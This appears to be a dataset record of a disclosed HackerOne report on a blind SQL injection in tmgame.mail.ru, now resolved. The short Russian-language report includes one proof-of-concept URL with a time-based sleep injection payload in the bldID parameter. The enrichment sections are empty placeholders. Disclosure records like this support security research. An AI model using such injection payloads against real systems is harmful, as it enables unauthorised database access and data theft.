---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '943487'
original_report_id: '943487'
title: tmgame.mail.ru - Blind sql injection
weakness: SQL Injection
team_handle: mailru
created_at: '2020-07-27T02:04:35.565Z'
disclosed_at: '2021-11-06T19:06:37.508Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
asset_identifier: 'Ext. O: Delegated subdomain or branded partner service'
asset_type: OTHER
max_severity: medium
tags:
- hackerone
- sql-injection
---

# tmgame.mail.ru - Blind sql injection

## Metadata

- HackerOne Report ID: 943487
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2021-11-06T19:06:37.508Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

https://tmgame.mail.ru/action.php?xml=1&acode=come_in&build_type=all&bldID=(select*from(select(sleep(20)))a)&bldlocID=8

bldID уязвимый get-параметор.

## Impact

Получение данных из бд.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
